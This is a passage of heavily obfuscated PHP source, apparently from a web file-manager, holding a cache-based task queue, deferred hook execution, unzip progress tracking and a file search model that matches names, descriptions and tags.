usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¬ßíÜº’[1794], $¬ßíÜº’[185]); } public static function getKey($ÜŠØÒ, $ºäÀï·é = "\151\156\x74") { $‡ÉÍïú† =& $_SERVER[³½¬ÚË¯]; Cache::removeMemory($ÜŠØÒ); $êœ×ıÊ = Cache::get($ÜŠØÒ); if ($ºäÀï·é == $‡ÉÍïú†[332]) { return $êœ×ıÊ ? intval($êœ×ıÊ) : 0; } if ($ºäÀï·é == $‡ÉÍïú†[1795]) { return is_array($êœ×ıÊ) ? $êœ×ıÊ : array(); } return $êœ×ıÊ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[³½¬ÚË¯][1795]); } public static function setAll($ù‹¾áÖ) { $•®’ûÕ¡ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ù‹¾áÖ), $•®’ûÕ¡); Cache::set(self::QUEUE_DATA, $ù‹¾áÖ, $•®’ûÕ¡); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($š™’î, $“ï¢œ…ı = 5.0) { if (!$š™’î) { return; } $Š©Ÿºú = Cache::get($š™’î); if (!$Š©Ÿºú || timeFloat() - floatVal($Š©Ÿºú) >= $“ï¢œ…ı) { Cache::set($š™’î, timeFloat(), $“ï¢œ…ı * 10); return !0; } return !1; } public static function timeLimitCall($ÚÙ—¾ù‘, $¼ãšÉß†, $ÑóŠëÂô, $¢Û´£Ïû = 5.0) { $Õå·Óë =& $_SERVER[³½¬ÚË¯]; if (!$ÚÙ—¾ù‘ || !$¼ãšÉß†) { return; } self::$asyncAdd = !0; $‰ÂßÊ… = $Õå·Óë[1796]; $Æ¾…ú¾Û = Cache::get($‰ÂßÊ…, !0); $¤Ü€¾… = array($Õå·Óë[1797] => timeFloat(), $Õå·Óë[1798] => timeFloat(), $Õå·Óë[308] => $¼ãšÉß†, $Õå·Óë[1788] => $ÑóŠëÂô, $Õå·Óë[194] => $¢Û´£Ïû); if (is_array($Æ¾…ú¾Û[$ÚÙ—¾ù‘])) { $¤Ü€¾…[$Õå·Óë[1798]] = $Æ¾…ú¾Û[$ÚÙ—¾ù‘][$Õå·Óë[1798]]; } if (is_array($Æ¾…ú¾Û[$ÚÙ—¾ù‘])) { if (timeFloat() - $Æ¾…ú¾Û[$ÚÙ—¾ù‘][$Õå·Óë[1797]] < $¤Ü€¾…[$Õå·Óë[194]] * 0.3) { return; } $¤Ü€¾…[$Õå·Óë[1798]] = $Æ¾…ú¾Û[$ÚÙ—¾ù‘][$Õå·Óë[1798]]; } $Æ¾…ú¾Û[$ÚÙ—¾ù‘] = $¤Ü€¾…; Cache::set($‰ÂßÊ…, $Æ¾…ú¾Û, 60); Cache::removeMemory($‰ÂßÊ…); write_log($Õå·Óë[1799] . $ÚÙ—¾ù‘ . $Õå·Óë[71] . $¼ãšÉß†, $Õå·Óë[185]); } public static function timeLimitCallLoop() { $Éş›£Ÿ‡ =& $_SERVER[³½¬ÚË¯]; $ÑïêÍßû = array($Éş›£Ÿ‡[1800]); $¦úÅ†Ä‚ = in_array(strtolower(ACTION), $ÑïêÍßû); if (!$¦úÅ†Ä‚ && !self::$asyncAdd) { return; } $â¨È¶×× = $Éş›£Ÿ‡[1796]; $¼æ§ªËÒ = Cache::get($â¨È¶××, !0); if (!$¼æ§ªËÒ || count($¼æ§ªËÒ) <= 0) { return; } $¢ƒ´Ò«ú = !1; $÷éšâÏî = timeFloat(); $—Õ‹êøµ = array(); foreach ($¼æ§ªËÒ as $¬«¨Óå“ => $‚ñ—’ü) { if ($÷éšâÏî - $‚ñ—’ü[$Éş›£Ÿ‡[1798]] > $‚ñ—’ü[$Éş›£Ÿ‡[194]]) { $¢ƒ´Ò«ú = !0; try { Hook::apply($‚ñ—’ü[$Éş›£Ÿ‡[308]], $‚ñ—’ü[$Éş›£Ÿ‡[1788]]); write_log($Éş›£Ÿ‡[1801] . $¬«¨Óå“ . $Éş›£Ÿ‡[71] . $‚ñ—’ü[$Éş›£Ÿ‡[308]] . $Éş›£Ÿ‡[1802] . ACTION, $Éş›£Ÿ‡[185]); } catch (Exception $²ƒõëû×) { } continue; } $—Õ‹êøµ[$¬«¨Óå“] = $‚ñ—’ü; } if (!$¢ƒ´Ò«ú) { return; } if (!$—Õ‹êøµ) { return Cache::remove($â¨È¶××); } Cache::set($â¨È¶××, $—Õ‹êøµ, 60); Cache::removeMemory($â¨È¶××); } public static function finished($çè¾°Ì¶, $ÉŒĞ¹ÉÒ) { $†šşÁœ =& $_SERVER[³½¬ÚË¯]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($†šşÁœ[308] => $çè¾°Ì¶, $†šşÁœ[1788] => $ÉŒĞ¹ÉÒ); } private static function finishedRun() { $ñØí¦£° =& $_SERVER[³½¬ÚË¯]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ü´Ğî) { try { Hook::apply($Ü´Ğî[$ñØí¦£°[308]], $Ü´Ğî[$ñØí¦£°[1788]]); } catch (Exception $’˜¸¨¨æ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ĞÛù¼Ø· =& $_SERVER[³½¬ÚË¯]; parent::startAfter(); Hook::bind($ĞÛù¼Ø·[1803], array($this, $ĞÛù¼Ø·[1804])); Hook::bind($ĞÛù¼Ø·[1236], array($this, $ĞÛù¼Ø·[1805])); Hook::bind($ĞÛù¼Ø·[1806], array($this, $ĞÛù¼Ø·[1807])); $–¸œĞ’› =& $this->task; $–¸œĞ’›[$ĞÛù¼Ø·[1808]] = $ĞÛù¼Ø·[1237]; if (!$–¸œĞ’›[$ĞÛù¼Ø·[1587]]) { $–¸œĞ’›[$ĞÛù¼Ø·[1587]] = LNG($ĞÛù¼Ø·[1809]); } } protected function endAfter() { $¼À…º±ü =& $_SERVER[³½¬ÚË¯]; parent::endAfter(); Hook::unbind($¼À…º±ü[1803], array($this, $¼À…º±ü[1804])); Hook::unbind($¼À…º±ü[1236], array($this, $¼À…º±ü[1805])); Hook::unbind($¼À…º±ü[1806], array($this, $¼À…º±ü[1807])); } public function updateAfter() { $õë˜ä…ô =& $_SERVER[³½¬ÚË¯]; $Ÿ øÃ‹¥ =& $this->task; if (!$Ÿ øÃ‹¥[$õë˜ä…ô[822]] || !$Ÿ øÃ‹¥[$õë˜ä…ô[799]]) { if ($Ÿ øÃ‹¥[$õë˜ä…ô[1808]] != $õë˜ä…ô[357]) { return; } } if ($Ÿ øÃ‹¥[$õë˜ä…ô[1808]] == $õë˜ä…ô[1237]) { $ëè»³‚§ = 0; if ($Ÿ øÃ‹¥[$õë˜ä…ô[1743]]) { $ëè»³‚§ = $Ÿ øÃ‹¥[$õë˜ä…ô[1744]] / $Ÿ øÃ‹¥[$õë˜ä…ô[1743]]; } $Ÿ øÃ‹¥[$õë˜ä…ô[1692]] = $ëè»³‚§ * 0.3; } else { if ($Ÿ øÃ‹¥[$õë˜ä…ô[1808]] == $õë˜ä…ô[357]) { $ëè»³‚§ = $Ÿ øÃ‹¥[$õë˜ä…ô[1691]] / $Ÿ øÃ‹¥[$õë˜ä…ô[822]]; $Ÿ øÃ‹¥[$õë˜ä…ô[1692]] = 0.3 + $ëè»³‚§ * 0.4; } else { if ($Ÿ øÃ‹¥[$õë˜ä…ô[1808]] == $õë˜ä…ô[107]) { $“’œ›™ = 0; if ($Ÿ øÃ‹¥[$õë˜ä…ô[1745]] == $õë˜ä…ô[107]) { $“’œ›™ = $Ÿ øÃ‹¥[$õë˜ä…ô[1744]]; } $ëè»³‚§ = ($Ÿ øÃ‹¥[$õë˜ä…ô[1748]] + $“’œ›™) / $Ÿ øÃ‹¥[$õë˜ä…ô[799]]; $Ÿ øÃ‹¥[$õë˜ä…ô[1692]] = 0.3 + 0.4 + $ëè»³‚§ * 0.3; } } } if ($Ÿ øÃ‹¥[$õë˜ä…ô[1692]] > 0) { $½»’¸“¡ = timeFloat() - $Ÿ øÃ‹¥[$õë˜ä…ô[1694]] - $Ÿ øÃ‹¥[$õë˜ä…ô[1697]]; $Ÿ øÃ‹¥[$õë˜ä…ô[1698]] = $½»’¸“¡ * (1 - $Ÿ øÃ‹¥[$õë˜ä…ô[1692]]) / $Ÿ øÃ‹¥[$õë˜ä…ô[1692]]; } } public function addFile($§´¢ƒ‡Ä) { $©‡³« =& $_SERVER[³½¬ÚË¯]; $Ø¼À´ É =& $this->task; $Ó£øæÁ = IO::info($§´¢ƒ‡Ä); $Ø¼À´ É[$©‡³«[1741]] = $Ó£øæÁ[$©‡³«[32]]; $Ø¼À´ É[$©‡³«[1743]] = $Ó£øæÁ[$©‡³«[76]]; $Ø¼À´ É[$©‡³«[1744]] = 0; $Ø¼À´ É[$©‡³«[1107]] = $©‡³«[1764]; $Ø¼À´ É[$©‡³«[1745]] = $©‡³«[1237]; $Ø¼À´ É[$©‡³«[799]] = $Ó£øæÁ[$©‡³«[76]]; $Ø¼À´ É[$©‡³«[822]] = 1; $©·—è„ï = 0; $Ø¼À´ É[$©‡³«[1752]] = array($©‡³«[1753] => $©·—è„ï + 1, $©‡³«[462] => $Ó£øæÁ[$©‡³«[32]], $©‡³«[84] => $Ó£øæÁ[$©‡³«[84]], $©‡³«[552] => $Ó£øæÁ[$©‡³«[552]] ? $Ó£øæÁ[$©‡³«[552]] : $Ó£øæÁ[$©‡³«[84]]); $this->update(); } public function zipEvent($æ¤ÅúÃØ, $è­†Äæ‘, $‘¶¸ğü, $ÍüóïÈÈ) { $òü¤ªã„ =& $_SERVER[³½¬ÚË¯]; $ãÒ¥£¦ =& $this->task; $ãÒ¥£¦[$òü¤ªã„[1741]] = get_path_this($è­†Äæ‘); $ãÒ¥£¦[$òü¤ªã„[1743]] = $ÍüóïÈÈ; $ãÒ¥£¦[$òü¤ªã„[1744]] = $‘¶¸ğü; $ãÒ¥£¦[$òü¤ªã„[1107]] = $æ¤ÅúÃØ == $òü¤ªã„[1810] ? $òü¤ªã„[1811] : $òü¤ªã„[1812]; $ãÒ¥£¦[$òü¤ªã„[1745]] = $òü¤ªã„[12]; $ãÒ¥£¦[$òü¤ªã„[799]] = $ÍüóïÈÈ; $ãÒ¥£¦[$òü¤ªã„[1808]] = $òü¤ªã„[357]; $this->update(); } public function unzipAfter($ÌÚø‹¸) { $ïÀ§ñ­Î =& $_SERVER[³½¬ÚË¯]; $¨ºåãêš =& $this->task; $¨ºåãêš[$ïÀ§ñ­Î[1808]] = $ïÀ§ñ­Î[107]; $Ò‡÷¶¶ = IO::infoWithChildren($ÌÚø‹¸); $±ÆÏù¡ô = 0; $¨ºåãêš[$ïÀ§ñ­Î[1752]] = array($ïÀ§ñ­Î[1753] => $±ÆÏù¡ô + 1, $ïÀ§ñ­Î[462] => $Ò‡÷¶¶[$ïÀ§ñ­Î[32]], $ïÀ§ñ­Î[84] => $Ò‡÷¶¶[$ïÀ§ñ­Î[84]], $ïÀ§ñ­Î[552] => $Ò‡÷¶¶[$ïÀ§ñ­Î[552]] ? $Ò‡÷¶¶[$ïÀ§ñ­Î[552]] : $Ò‡÷¶¶[$ïÀ§ñ­Î[84]]); if ($Ò‡÷¶¶[$ïÀ§ñ­Î[33]] == $ïÀ§ñ­Î[214]) { $¨ºåãêš[$ïÀ§ñ­Î[822]] = 1; } else { $¨ºåãêš[$ïÀ§ñ­Î[822]] = $Ò‡÷¶¶[$ïÀ§ñ­Î[79]][$ïÀ§ñ­Î[77]]; } $¨ºåãêš[$ïÀ§ñ­Î[1107]] = $ïÀ§ñ­Î[12]; $¨ºåãêš[$ïÀ§ñ­Î[1745]] = 0; $¨ºåãêš[$ïÀ§ñ­Î[1691]] = 0; $¨ºåãêš[$ïÀ§ñ­Î[1743]] = 0; $¨ºåãêš[$ïÀ§ñ­Î[1744]] = 0; $¨ºåãêš[$ïÀ§ñ­Î[1741]] = $ïÀ§ñ­Î[12]; $¨ºåãêš[$ïÀ§ñ­Î[1748]] = 0; $¨ºåãêš[$ïÀ§ñ­Î[799]] = $Ò‡÷¶¶[$ïÀ§ñ­Î[76]]; $this->update(); self::log($ïÀ§ñ­Î[1813] . json_encode(array($¨ºåãêš, $Ò‡÷¶¶))); } public function nameParse($şÑÄ¯Ö†) { $Ç×æƒ¨ù =& $_SERVER[³½¬ÚË¯]; $Ğ……–İ¢ =& $this->task; if ($Ğ……–İ¢[$Ç×æƒ¨ù[1808]] == $Ç×æƒ¨ù[1237]) { $Ğ……–İ¢[$Ç×æƒ¨ù[1808]] = $Ç×æƒ¨ù[357]; $Ğ……–İ¢[$Ç×æƒ¨ù[1748]] = 0; $Ğ……–İ¢[$Ç×æƒ¨ù[799]] = 0; } $ó´¼³ÃÃ = get_path_this($şÑÄ¯Ö†); if (strstr($ó´¼³ÃÃ, $Ç×æƒ¨ù[10])) { $Ğ……–İ¢[$Ç×æƒ¨ù[1691]] += 1; $Ğ……–İ¢[$Ç×æƒ¨ù[822]] += 1; } $Ğ……–İ¢[$Ç×æƒ¨ù[1741]] = $şÑÄ¯Ö†; $this->update(); } } goto Eº÷ùöóÚ; cÈ‡‚§¹‰Õ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Øøø‰”´) { $Æ•¶Â’ =& $_SERVER[³½¬ÚË¯]; $‰ù…¸íò = KodIO::fileTypeList(); $›Ä¢‹‹Ç = $‰ù…¸íò[$Øøø‰”´]; if (!$›Ä¢‹‹Ç) { return array(); } $Êèåğ¨Ğ = $›Ä¢‹‹Ç[$Æ•¶Â’[175]]; $óş³§™‚ = $Æ•¶Â’[7]; if (!$›Ä¢‹‹Ç[$Æ•¶Â’[175]]) { $ˆè¼Ô·† = array_to_keyvalue($‰ù…¸íò, $Æ•¶Â’[12], $Æ•¶Â’[175]); $Êèåğ¨Ğ = implode($Æ•¶Â’[50], $ˆè¼Ô·†); $óş³§™‚ = $Æ•¶Â’[2144]; } $é‡Æºşó = explode($Æ•¶Â’[50], trim($Êèåğ¨Ğ, $Æ•¶Â’[50])); return array($óş³§™‚, $é‡Æºşó); } public function listPathType($ÁÒĞÂë) { $¶•ËÏÃ =& $_SERVER[³½¬ÚË¯]; $‘´¡‚®ƒ = $this->fileTypeWhere($ÁÒĞÂë); if (!$‘´¡‚®ƒ) { return array(); } $Ş°·åÆ = USER_ID; $ÌŞØ‰úò = Model($¶•ËÏÃ[568])->getInfo($Ş°·åÆ); $ŒÅ•Ìóİ = array($¶•ËÏÃ[617] => SourceModel::TYPE_USER, $¶•ËÏÃ[554] => array($¶•ËÏÃ[581], $¶•ËÏÃ[564] . $ÌŞØ‰úò[$¶•ËÏÃ[87]][$¶•ËÏÃ[181]] . $¶•ËÏÃ[582]), $¶•ËÏÃ[618] => $Ş°·åÆ, $¶•ËÏÃ[615] => 0, $¶•ËÏÃ[616] => $‘´¡‚®ƒ); return $this->listSource($ŒÅ•Ìóİ); } public function listSearch($³ÒÅ‹ëÂ, $ŸÎ‰íÂ = 300) { $Â¡“å½ =& $_SERVER[³½¬ÚË¯]; if (isset($³ÒÅ‹ëÂ[$Â¡“å½[1982]]) && $³ÒÅ‹ëÂ[$Â¡“å½[1982]]) { $³ÒÅ‹ëÂ[$Â¡“å½[1982]] = str_replace($Â¡“å½[428], $Â¡“å½[2145], trim($³ÒÅ‹ëÂ[$Â¡“å½[1982]])); } $¤é§ôóø = $this->_parseSearchWhere($³ÒÅ‹ëÂ); if (!isset($¤é§ôóø[$Â¡“å½[473]])) { $¤é§ôóø[$Â¡“å½[473]] = 0; } $à»Éµà = $Â¡“å½[2146]; $éññ—œÈ = $¤é§ôóø; $šíØşÅÏ = $à»Éµà; $this->_listSearchBindPinyin($³ÒÅ‹ëÂ, $¤é§ôóø, $à»Éµà); $this->alias($Â¡“å½[487])->_makeOrder(); $¤é§ôóø = $this->parseWhereLike($¤é§ôóø); $®»«ËÕ¿ = $this->distinct(!0)->field($à»Éµà)->where($¤é§ôóø)->selectPage($ŸÎ‰íÂ); if ($GLOBALS[$Â¡“å½[6]][$Â¡“å½[425]][$Â¡“å½[426]] && Input::check($³ÒÅ‹ëÂ[$Â¡“å½[1982]], $Â¡“å½[624]) && $®»«ËÕ¿[$Â¡“å½[410]][$Â¡“å½[397]] == 1 && $®»«ËÕ¿[$Â¡“å½[410]][$Â¡“å½[411]] == 0) { $®»«ËÕ¿ = $this->distinct(!0)->field($à»Éµà)->where($éññ—œÈ)->limit(1000)->select(); $®»«ËÕ¿ = array_page_split($®»«ËÕ¿, !1, $ŸÎ‰íÂ); } $this->_listSearchFileContent($®»«ËÕ¿, $³ÒÅ‹ëÂ, $šíØşÅÏ, $éññ—œÈ); $this->_listSearchDesc($®»«ËÕ¿, $³ÒÅ‹ëÂ, $šíØşÅÏ); $this->_listSearchTag($®»«ËÕ¿, $³ÒÅ‹ëÂ, $šíØşÅÏ); $this->_listSearchGroupTag($®»«ËÕ¿, $³ÒÅ‹ëÂ, $šíØşÅÏ); $this->_listDataApply($®»«ËÕ¿[$Â¡“å½[413]]); $this->_listMake($®»«ËÕ¿); return $®»«ËÕ¿; } private function _listSearchFileContent(&$çÛ…Õø, $¤¦è‹‰™, $Ìô‡å—½, $ÅÓüç•¸) { $Åßì¼ä =& $_SERVER[³½¬ÚË¯]; if (!$¤¦è‹‰™[$Åßì¼ä[1982]] || $çÛ…Õø[$Åßì¼ä[410]][$Åßì¼ä[397]] > 1) { return; } if (!isset($ÅÓüç•¸[$Åßì¼ä[32]]) || !is_array($¤¦è‹‰™[$Åßì¼ä[509]])) { return; } $ÅÓüç•¸[$Åßì¼ä[509]] = array($Åßì¼ä[7], $¤¦è‹‰™[$Åßì¼ä[509]]); unset($ÅÓüç•¸[$Åßì¼ä[32]]); unset($¤¦è‹‰™[$Åßì¼ä[509]]); $éªã‹œí = $this->field($Ìô‡å—½)->where($ÅÓüç•¸)->limit($Åßì¼ä[2147])->select(); if (!$éªã‹œí || count($éªã‹œí) == 0) { return; } $çÛ…Õø[$Åßì¼ä[413]] = array_merge($éªã‹œí, $çÛ…Õø[$Åßì¼ä[413]]); $çÛ…Õø[$Åßì¼ä[410]][$Åßì¼ä[411]] += count($éªã‹œí); } private function _listSearchTag(&$¤ûçÁ«ª, $’µñ»ßÌ, $Ü èšÂÙ) { $äÇòÁî© =& $_SERVER[³½¬ÚË¯]; if (!$’µñ»ßÌ[$äÇòÁî©[1982]] || $¤ûçÁ«ª[$äÇòÁî©[410]][$äÇòÁî©[397]] > 1) { return; } $†¯¹ß®¿ = Model($äÇòÁî©[2148])->listData(); $Ã‹ŒáÍ = array(); $×«ºìº’ = $’µñ»ßÌ[$äÇòÁî©[1982]]; foreach ($†¯¹ß®¿ as $ºé½ô•À) { $‚”îš˜¡ = $ºé½ô•À[$äÇòÁî©[32]]; $¼Î›ú™ = str_replace($äÇòÁî©[53], $äÇòÁî©[12], Pinyin::get($‚”îš˜¡)); if (stripos($‚”îš˜¡, $×«ºìº’) !== !1 || stripos($¼Î›ú™, $×«ºìº’) !== !1) { $Ã‹ŒáÍ[] = $ºé½ô•À[$äÇòÁî©[443]]; } } if (!$Ã‹ŒáÍ) { return; } $†ó©’Ù€ = array($äÇòÁî©[468] => array($äÇòÁî©[7], $Ã‹ŒáÍ), $äÇòÁî©[1690] => USER_ID); $ñ…ê­â® = Model($äÇòÁî©[470])->field($äÇòÁî©[84])->where($†ó©’Ù€)->select(); $ñ…ê­â® = array_to_keyvalue($ñ…ê­â®, $äÇòÁî©[12], $äÇòÁî©[84]); $³˜åøÚ = array_unique($ñ…ê­â®); $this->_listSearchMerge($¤ûçÁ«ª, $’µñ»ßÌ, $Ü èšÂÙ, $³˜åøÚ); } private function _listSearchDesc(&$¨®Á¶ìğ, $ßÊ†ÍÜ•, $¦Ò†é›) { $¬¸ºÒÕŞ =& $_SERVER[³½¬ÚË¯]; if (!$ßÊ†ÍÜ•[$¬¸ºÒÕŞ[1982]] || $¨®Á¶ìğ[$¬¸ºÒÕŞ[410]][$¬¸ºÒÕŞ[397]] > 1) { return; } $Üïş¨”¬ = array($¬¸ºÒÕŞ[94] => $¬¸ºÒÕŞ[494], $¬¸ºÒÕŞ[418] => array($¬¸ºÒÕŞ[427], $¬¸ºÒÕŞ[1984] . $ßÊ†ÍÜ•[$¬¸ºÒÕŞ[1982]] . $¬¸ºÒÕŞ[1984])); $îìÏÔíÄ = !1; if ($îìÏÔíÄ) { $ëÓ¡“Æï = $this->listSearchChildren($ßÊ†ÍÜ•[$¬¸ºÒÕŞ[180]]); $ëÓ¡“Æï = array_unique($ëÓ¡“Æï); if (!$ëÓ¡“Æï) { return; } $Üïş¨”¬[$¬¸ºÒÕŞ[181]] = array($¬¸ºÒÕŞ[7], $ëÓ¡“Æï); } $¼ûÚı©¨ = Model($¬¸ºÒÕŞ[601])->field($¬¸ºÒÕŞ[181])->where($Üïş¨”¬)->limit(5000)->select(); $‰¿ã¿æ‹ = array_to_keyvalue($¼ûÚı©¨, $¬¸ºÒÕŞ[12], $¬¸ºÒÕŞ[181]); $this->_listSearchMerge($¨®Á¶ìğ, $ßÊ†ÍÜ•, $¦Ò†é›, $‰¿ã¿æ‹); } private function _listSearchGroupTag(&$æ›™ãÉ¯, $¦çÙî¤, $úÌå¬¾ğ) { $«ñÊÄö =& $_SERVER[³½¬ÚË¯]; if (!$¦çÙî¤[$«ñÊÄö[1982]] || $æ›™ãÉ¯[$«ñÊÄö[410]][$«ñÊÄö[397]] > 1 || !$¦çÙî¤[$«ñÊÄö[180]]) { return; } $İ¯ŸÇæÖ = $this->sourceInfo($¦çÙî¤[$«ñÊÄö[180]]); if (!$İ¯ŸÇæÖ || $İ¯ŸÇæÖ[$«ñÊÄö[178]] != SourceModel::TYPE_GROUP) { return; } $‡ ìÏıÊ = $İ¯ŸÇæÖ[$«ñÊÄö[539]]; $™ÁêÁğŒ = Model($«ñÊÄö[2149])->get($‡ ìÏıÊ); $£äÇŠ°› = array(); $ã¸Ò™Ê¾ = $¦çÙî¤[$«ñÊÄö[1982]]; foreach ($™ÁêÁğŒ[$«ñÊÄö[413]] as $”·Ÿò³) { $œ„ßè›Á = $”·Ÿò³[$«ñÊÄö[32]]; $æ„â ƒí = str_replace($«ñÊÄö[53], $«ñÊÄö[12], Pinyin::get($œ„ßè›Á)); if (stripos($œ„ßè›Á, $ã¸Ò™Ê¾) !== !1 || stripos($æ„â ƒí, $ã¸Ò™Ê¾) !== !1) { $£äÇŠ°›[] = $”·Ÿò³[$«ñÊÄö[443]]; } } if (!$£äÇŠ°›) { return; } $í­„Ñò = array($«ñÊÄö[468] => array($«ñÊÄö[7], $£äÇŠ°›), $«ñÊÄö[1690] => 0, $«ñÊÄö[33] => $«ñÊÄö[2004] . $‡ ìÏıÊ); $ì§ºë¢º = Model($«ñÊÄö[470])->field($«ñÊÄö[84])->where($í­„Ñò)->select(); $ì§ºë¢º = array_to_keyvalue($ì§ºë¢º, $«ñÊÄö[12], $«ñÊÄö[84]); $ê÷¤¬Ë = array_unique($ì§ºë¢º); $this->_listSearchMerge($æ›™ãÉ¯, $¦çÙî¤, $úÌå¬¾ğ, $ê÷¤¬Ë); } private function _listSearchMerge(&$ô·‘‚¸, $èù®òÊ¡, $ †½Ó°‹, $«´•£×õ) { $Ì¬Ú•¨á =& $_SERVER[³½¬ÚË¯]; if (!$«´•£×õ) { return; } $Ÿ€ì‡ï = array_to_keyvalue($ô·‘‚¸[$Ì¬Ú•¨á[413]], $Ì¬Ú•¨á[12], $Ì¬Ú•¨á[181]); $êêİÊ ë = array_diff($«´•£×õ, $Ÿ€ì‡ï); if (!$êêİÊ ë) { return; } $÷Š¶¥‚ò = array($Ì¬Ú•¨á[181] => array($Ì¬Ú•¨á[7], $êêİÊ ë)); $‚µ÷…È = $this->field($ †½Ó°‹)->where($÷Š¶¥‚ò)->select(); if (!$‚µ÷…È) { return; } $È•»·˜§ = array(); foreach ($‚µ÷…È as $¯ò€ø¥À) { if ($this->_listSearchFilter($¯ò€ø¥À, $èù®òÊ¡)) { $È•»·˜§[] = $¯ò€ø¥À; } } $ô·‘‚¸[$Ì¬Ú•¨á[413]] = array_merge($È•»·˜§, $ô·‘‚¸[$Ì¬Ú•¨á[413]]); $ô·‘‚¸[$Ì¬Ú•¨á[410]][$Ì¬Ú•¨á[411]] += count($È•»·˜§); } private function _listSearchFilter($Å†ëÚ­¤, $Áœá¾í”) { $ï»€ÒÃ‰ =& $_SERVER[³½¬ÚË¯]; $û¤‰…˜¥ = $Å†ëÚ­¤[$ï»€ÒÃ‰[453]] == $ï»€ÒÃ‰[88]; if (!strstr($Å†ëÚ­¤[$ï»€ÒÃ‰[554]], $ï»€ÒÃ‰[50] . $Áœá¾í”[$ï»€ÒÃ‰[180]] . $ï»€ÒÃ‰[50])) { return !1; } if (isset($Áœá¾í”[$ï»€ÒÃ‰[454]]) && $Áœá¾í”[$ï»€ÒÃ‰[454]] != $ï»€ÒÃ‰[1943]) { if ($Áœá¾í”[$ï»€ÒÃ‰[454]] == $ï»€ÒÃ‰[75] && !$û¤‰…˜¥) { return !1; } if ($Áœá¾í”[$ï»€ÒÃ‰[454]] != $ï»€ÒÃ‰[75] && $û¤‰…˜¥) { return !1; } if (!strstr($Å†ëÚ­¤[$ï»€ÒÃ‰[175]], $ï»€ÒÃ‰[50] . $Áœá¾í”[$ï»€ÒÃ‰[454]] . $ï»€ÒÃ‰[50])) { return !1; } } if (isset($Áœá¾í”[$ï»€ÒÃ‰[2150]]) && $Áœá¾í”[$ï»€ÒÃ‰[2150]] < $Å†ëÚ­¤[$ï»€ÒÃ‰[76]]) { return !1; } if (isset($Áœá¾í”[$ï»€ÒÃ‰[2151]]) && $Áœá¾í”[$ï»€ÒÃ‰[2151]] > $Å†ëÚ­¤[$ï»€ÒÃ‰[76]]) { return !1; } if (isset($Áœá¾í”[$ï»€ÒÃ‰[631]]) && $Áœá¾í”[$ï»€ÒÃ‰[631]] != $Å†ëÚ­¤[$ï»€ÒÃ‰[497]]) { return !1; } return !0; } public function listSearchChildren($¥ÀÒÊ¼ù, $«†Ë®™Ì = 5000) { $¾”©èÌÉ =& $_SERVER[³½¬ÚË¯]; $€Ë°Æ‡ù = array(); $ùö‹˜İÙ = $this->sourceInfo($¥ÀÒÊ¼ù); $ò—¡±¾Ó = array($¾”©èÌÉ[554] => array($¾”©èÌÉ[427], $ùö‹˜İÙ[$¾”©èÌÉ[554]] . $ùö‹˜İÙ[$¾”©èÌÉ[181]] . $¾”©èÌÉ[582])); $Ñé„¿¨º = $this->field($¾”©èÌÉ[76])->where($ò—¡±¾Ó)->limit($«†Ë®™Ì + 1)->select(); $äšäÌÕÉ = is_array($Ñé„¿¨º) ? count($Ñé„¿¨º) : 0; if ($äšäÌÕÉ > $«†Ë®™Ì) { return $this->_listSearchChildrenNear($¥ÀÒÊ¼ù, $«†Ë®™Ì); } $¼õÇ¹ = $this->field($¾”©èÌÉ[181])->where($ò—¡±¾Ó)->select(); $€Ë°Æ‡ù = array_to_keyvalue($¼õÇ¹, $¾”©èÌÉ[12], $¾”©èÌÉ[181]); return $€Ë°Æ‡ù; } private function _listSearchChildrenNear($Â§½ÎÂ¬, $·½ˆå« ) { $şÀÒ‹Õ =& $_SERVER[³½¬ÚË¯]; $¿³ö÷Ó = array(); $É•ì¬´» = array($şÀÒ‹Õ[180] => $Â§½ÎÂ¬); $Û›ÎÑµ› = $this->field($şÀÒ‹Õ[2152])->where($É•ì¬´»)->select(); $ÊÀå¤‡£ = array_to_keyvalue(array_filter_by_field($Û›ÎÑµ›, $şÀÒ‹Õ[453], $şÀÒ‹Õ[88]), $şÀÒ‹Õ[12], $şÀÒ‹Õ[181]); $¿³ö÷Ó = array_merge($¿³ö÷Ó, array_to_keyvalue($Û›ÎÑµ›, $şÀÒ‹Õ[12], $şÀÒ‹Õ[181])); if (!$ÊÀå¤‡£) { return $¿³ö÷Ó; } $É•ì¬´» = array($şÀÒ‹Õ[180] => array($şÀÒ‹Õ[7], $ÊÀå¤‡£)); $Û›ÎÑµ› = $this->field($şÀÒ‹Õ[2152])->where($É•ì¬´»)->limit($·½ˆå« )->select(); $¿³ö÷Ó = array_merge($¿³ö÷Ó, array_to_keyvalue($Û›ÎÑµ›, $şÀÒ‹Õ[12], $şÀÒ‹Õ[181])); $¿³ö÷Ó = array_slice($¿³ö÷Ó, 0, $·½ˆå« ); return $¿³ö÷Ó; } private function _listSearchBindPinyin($±ò„›æ, &$ªò¾ı»Ì, &$¼¨±Ü®î) { $Š½å =& $_SERVER[³½¬ÚË¯]; if (!isset($±ò„›æ[$Š½å[1982]]) || !$±ò„›æ[$Š½å[1982]]) { return; } if (!Input::check($±ò„›æ[$Š½å[1982]], $Š½å[362]) || strlen($±ò„›æ[$Š½å[1982]]) < 2) { return; } $ªÖĞ¯ì = "\114\x45\x46\x54\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\151\157\x5f\163\157\165\x72\143\145\137\155\x65\164\x61\x20\x6d\x65\x74\x61\x20\157\156\40\163\157\165\x72\143\x65\x2e\163\x6f\x75\162\x63\145\x49\104\40\x3d\40\155\145\164\x61\x2e\163\x6f\165\x72\x63\145\x49\104"; $Ç¦ĞàôÀ = array(); $¼¨±Ü®î = str_replace(array($Š½å[246], $Š½å[53], $Š½å[2153]), $Š½å[12], 